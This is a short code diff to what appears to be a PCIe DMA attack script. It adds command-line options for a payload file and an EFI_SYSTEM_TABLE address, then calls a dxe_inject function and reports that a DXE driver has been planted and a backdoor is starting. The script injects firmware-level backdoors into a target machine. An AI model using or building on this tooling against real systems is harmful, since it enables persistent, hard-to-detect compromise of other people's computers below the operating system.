@@ -2,7 +2,7 @@
 
 import sys, os
 from struct import pack, unpack
-from hexdump import hexdump
+from optparse import OptionParser
 
 from pcie_lib import *
 from uefi import *
@@ -11,11 +11,21 @@ HV_INFO_ADDR = STATUS_ADDR - (8 * 5)
 
 def main():
 
-    payload = sys.argv[1] if len(sys.argv) > 1 else None
+    parser = OptionParser()
 
-    dev = dxe_inject(payload = payload)
+    parser.add_option('-p', '--payload', dest = 'payload', default = None,
+        help = 'payload file path')
+
+    parser.add_option('-s', '--system-table', dest = 'system_table', default = None,
+        help = 'EFI_SYSTEM_TABLE address')
+
+    # parse command line
+    options, _ = parser.parse_args()
+    options.system_table = None if options.system_table is None else int(options.system_table, 16)
+
+    dev = dxe_inject(payload = options.payload, system_table = options.system_table)
         
-    if payload is None: return 0
+    if options.payload is None: return 0
 
     print('[+] DXE driver was planted, waiting for backdoor init...')    
 
